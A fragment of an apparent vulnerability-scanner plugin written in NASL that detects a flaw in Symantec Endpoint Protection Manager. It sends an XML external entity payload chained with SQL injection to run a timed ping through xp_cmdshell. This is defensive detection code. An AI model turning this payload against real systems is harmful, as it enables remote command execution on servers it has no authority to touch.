...
if(http_vuln_check( port: http_port, url: "/", check_header: TRUE, usecache: TRUE, pattern: ">Symantec Endpoint Protection Manager<", extra_check: "Symantec Corporation<" )){
	sleep = make_list( 3,
		 5 );
	for i in sleep {
		url = "/servlet/ConsoleServlet?ActionType=ConsoleLog";
		postdata = NASLString( "------=_Part_156_33010715.1234\r\n", "Content-Type: text/xml\r\n", "Content-Disposition: form-data; name=\"Content\"\r\n\r\n", "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n", "<!DOCTYPE sepm [<!ENTITY payload SYSTEM \"http://127.0.0.1:", http_port, "/servlet/ConsoleServlet?ActionType=ConfigServer&action=test_av&Sequence", "Num=140320121&Parameter=a\'; call xp_cmdshell(\'ping -n ", i + 1, " 127.0.0.1\');--\" >]>\r\n", "<request>\r\n", "<xxe>&payload;</xxe>\r\n", "</request>\r\n", "------=_Part_156_33010715.1234--" );
